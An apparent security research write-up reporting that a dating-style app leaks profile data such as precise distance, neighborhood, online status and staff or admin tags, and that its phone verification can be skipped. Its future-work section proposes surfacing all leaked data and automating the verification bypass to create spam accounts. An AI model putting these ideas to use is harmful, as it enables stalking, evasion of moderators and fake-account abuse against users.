Looking at the data we got from other users, it can be said that this app leaks a lot of user data. Just by looking at a profile you get information about the last login, join date, is boosting, is online and is login, has likes remaining, match analysis without any interaction, sometimes home neighborhood and a pretty precise distance. Also tags about is staff or is admin are shown. So in theory staff and admins can be avoided. 
It's also interesting that the whole verification with a phone number can be skipped. So in theory if this can be automated, spam accounts could be made with ease, because they also don't care about the email entered. 

## Future work
The app could be modified in a way that the app can present all leaked data, when going to a user profile. And the number skip could possibly be automated.